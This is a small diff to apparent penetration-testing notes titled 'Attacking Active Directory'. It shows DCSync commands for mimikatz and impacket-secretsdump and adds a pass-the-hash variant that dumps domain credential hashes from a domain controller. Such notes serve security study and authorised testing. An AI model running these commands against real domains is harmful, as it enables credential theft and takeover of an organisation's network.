@@ -136,3 +136,4 @@ pagetitle: Attacking Active Directory
 	- `lsadump::dcsync /user:{domain}\{user}` 
 - Can also be performed with `impacket-secretsdump`
 	- `impacket-secretsdump -just-dc-user {target_domain_user} {domain}/{admin_username}:"{password}"@{DC_IP}`
+	- `impacket-secretsdump -hashes :{NTLM_hash} {domain}/{user}@{DC_IP}`
